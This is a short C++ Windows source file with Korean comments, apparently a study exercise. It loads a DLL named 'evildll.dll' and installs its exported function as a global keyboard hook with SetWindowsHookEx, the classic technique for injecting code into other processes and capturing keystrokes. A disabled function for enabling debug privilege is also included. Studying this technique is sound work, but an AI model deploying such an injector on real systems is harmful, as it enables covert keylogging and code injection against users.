#include <windows.h>
#include <cstdio>
#include "pch.h"
#include <stdio.h>


typedef int(__cdecl* FProc)();
/*
BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid; // 현재 프로세스의 핸들을 가져와 관련된 액세스토큰을 가져옴. 

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken error: %u\n",
            GetLastError());
        return FALSE;
    }

    // 로컬 시스템에 대한 LUID를 가져옴. 
    if (!LookupPrivilegeValue(NULL, // lookup privilege on local system 
        lpszPrivilege, // privilege to lookup 
        &luid)) // receives LUID of privilege 
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;

    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges. 
    if (!AdjustTokenPrivileges(hToken, // 액세스 토큰 핸들 
        FALSE, // TURE일 경우 모든 권한 비활성화 
        &tp, // TOKEN_PRIBILEGES 구조체 포인터 
        sizeof(TOKEN_PRIVILEGES), // 다음에 오는 버퍼의 사이즈 
        (PTOKEN_PRIVILEGES)NULL, // 이전 상태 없어도 됨 
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }
    return TRUE;
}
*/

int main(void) {
	HINSTANCE evilDLL;
	FProc BFunc;

    // SetPrivilege(SE_DEBUG_NAME,true);

	// evil.dll 로드
	evilDLL = LoadLibrary(TEXT("evildll.dll"));

	// evil.dll에서 exported func인 Bfunc가져오기
	BFunc = (FProc)GetProcAddress(evilDLL, "Bfunc");

	// H_KEYBOARD 관련 이벤트 메시지 후킹할것.
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)BFunc, evilDLL, 0);
	Sleep(5 * 1000);
	UnhookWindowsHookEx(hook); //언후크

	return 0;
}